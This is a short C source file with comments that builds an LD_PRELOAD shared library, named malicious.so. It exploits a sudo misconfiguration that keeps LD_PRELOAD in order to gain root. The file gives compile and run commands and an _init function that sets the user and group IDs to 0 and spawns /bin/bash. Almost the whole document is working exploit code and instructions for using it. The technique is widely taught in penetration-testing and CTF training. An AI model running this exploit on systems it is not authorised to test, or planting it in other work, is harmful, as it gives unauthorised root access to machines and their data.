/*
 * Purpose: This code creates a shared library for Linux privilege escalation using LD_PRELOAD.
 * It escalates privileges to root and spawns a local root shell (/bin/bash) when loaded.
 * The library is designed to exploit a sudo misconfiguration (e.g., !env_reset in sudoers)
 * that preserves the LD_PRELOAD environment variable. When a command like
 * "sudo /usr/bin/ping" is run with LD_PRELOAD set to this library, it executes as root
 * and provides an interactive root shell on the local machine.
 *
 * How it works:
 * 1. The _init function runs automatically when the library is loaded.
 * 2. It clears LD_PRELOAD to avoid infinite loops.
 * 3. It sets the group and user IDs to 0 (root) to escalate privileges.
 * 4. It spawns /bin/bash as root using system(), ie it makes you the root
 *
 * Usage:
 * 1. Compile: gcc -fPIC -shared -o malicious.so malicious.c -nostartfiles
 * 2. Run: sudo LD_PRELOAD=./malicious.so /usr/bin/ping
 * 3. Result: A root shell (# prompt) is spawned locally, ie you should now be root!
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h> // For setuid/setgid
#include <unistd.h>    // For setuid/setgid and unsetenv

void _init() {
    unsetenv("LD_PRELOAD"); // Prevent infinite loop by clearing LD_PRELOAD
    setgid(0);             // Set group ID to root (0)
    setuid(0);             // Set user ID to root (0)
    system("/bin/bash");   // Spawn a root shell
}
